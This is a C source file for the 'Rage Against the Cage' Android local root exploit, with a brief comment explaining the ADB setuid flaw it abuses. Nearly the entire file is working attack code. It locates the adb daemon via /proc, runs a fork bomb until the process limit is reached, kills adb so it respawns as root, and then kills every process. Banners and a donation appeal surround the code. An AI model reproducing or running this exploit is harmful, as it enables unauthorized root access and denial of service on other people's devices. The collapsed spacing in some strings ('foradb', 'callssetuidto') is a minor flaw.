/**
 * Rage Against the Cage (RAtC) exploits the fact that the Android Debug Bridge (ABD) daemon 
 * on Android devices starts as root by default, and callssetuidto drop its privileges to 
 * those of a shell account.
 * In Linux, a system-wide resource limit, RLIMIT_NPROC, defines the maximum number of 
 * simultaneous processes allowed by the system (Android, in this case).
 * RAtC checks this limit, and spawns processes that do nothing until Android's limit is 
 * reached. This is called a fork bomb.
 * see https://www.claudxiao.net/2011/04/android-adb-setuid/
 */
#include<stdio.h>
#include<sys/types.h>
#include<sys/time.h>
#include<sys/resource.h>
#include<unistd.h>
#include<fcntl.h>
#include<errno.h>
#include<string.h>
#include<signal.h>
#include<stdlib.h>

void die(const char *msg) {
    perror(msg);
    exit(errno);
}

pid_t find_adb() {
    char buf[256];
    int i = 0, fd = 0;
    pid_t found = 0;

    for (i = 0; i < 32000; ++i) {
        sprintf(buf,"/proc/%d/cmdline", i);
        if ((fd = open(buf, O_RDONLY)) < 0) {
            continue;
        }
        memset(buf, 0,sizeof(buf));
        read(fd, buf,sizeof(buf) - 1);
        close(fd);

        if (strstr(buf,"/sbin/adb")) {
            found = i;
            break;
        }
    }
    return found;
}

void restart_adb(pid_t pid) {
    kill(pid, 9);
}

void wait_for_root_adb(pid_t old_adb) {
    pid_t p = 0;
    for(;;) {
        p = find_adb();
        if(p != 0 && p != old_adb) {
            break;
        }
        sleep(1);
    }
    sleep(5);
    kill(-1, 9);
}

int main(int argc, char **argv) {
    pid_t adb_pid = 0, p;
    int pids = 0, new_pids = 1;
    int pepe[2];
    char c = 0;
    struct rlimit rl;
    printf(" CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
    printf(" checking NPROC limit ...\n");
    if (getrlimit(RLIMIT_NPROC, &rl) < 0) {
        die("[-]getrlimit");
    }
    if (rl.rlim_cur== RLIM_INFINITY) {
        printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
        exit(1);
    }
    printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
    printf(" Searching foradb...\n");
    adb_pid = find_adb();
    if (!adb_pid) {
        die("[-] Cannot findadb");
    }
    printf("[+] Foundadbas PID %d\n", adb_pid);
    printf(" Spawning children.Donttype anything and wait for reset!\n");
    printf("\n If you like what we are doing you can send us PayPal money to\n"
            " 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"
            " If you are a company and feel like you profit from our work,\n"
            " we also accept donations > 1000 USD!\n");
    printf("\nadbconnection will be reset. restartadbserver on desktop and re-login.\n");
    sleep(5);
    if (fork() > 0) {
        exit(0);
    }
    setsid();
    pipe(pepe);
    if (fork() == 0) {
        close(pepe[0]);
        for(;;) {
            if((p = fork()) == 0) {
                exit(0);
            } else if(p < 0) {
                if(new_pids) {
                    printf("\n[+] Forked %dchilds.\n", pids);
                    new_pids = 0;
                    write(pepe[1], &c, 1);
                    close(pepe[1]);
                }
            } else {
                ++pids;
            }
        }
    }
    close(pepe[1]);
    read(pepe[0], &c, 1);
    restart_adb(adb_pid);
    if (fork() == 0) {
        fork();
        for (;;) {
            sleep(0x743C);
        }
    }
    wait_for_root_adb(adb_pid);
    return 0;
}
